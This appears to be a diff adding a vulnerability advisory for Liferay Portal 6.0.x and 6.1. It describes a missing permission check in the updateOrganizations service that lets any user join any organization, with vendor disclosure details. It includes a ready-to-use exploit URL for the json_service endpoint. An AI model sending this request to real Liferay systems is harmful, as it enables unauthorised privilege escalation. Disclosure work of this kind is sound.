@@ -1,0 +1,29 @@
+Liferay users can assign themselves to organizations, leading to
+possible privilege escalation
+
+Description:
+
+Liferay Portal is an enterprise portal written in Java
+
+Due to insufficient permission checking in the updateOrganizations
+method of UserService any user
+can assign hem or her self to any organization by issueing a single http request
+
+http://vulnerabilehost/c/portal/json_service?serviceClassName=com.lifera
+y.portal.service.UserServiceUtil&serviceMethodName=updateOrganizations&s
+erviceParameters=%5B%27userId%27%2C+%27organizationIds%27%5D&userId=YOUR
+_USER_ID&organizationIds=TARGET_ORGANIZATION_ID
+
+It is common to grant special privileges to members of an organization.
+
+Systems affected:
+
+Liferay 6.1 ce
+Liferay 6.1 ee
+liferay 6.0.x
+
+Vendor status :
+
+Liferay was notified april 22 2012 by filing a bug in their public
+bugtracker under issue number
+LPS-26887. The issue has since been flagged as private and has been resolved.
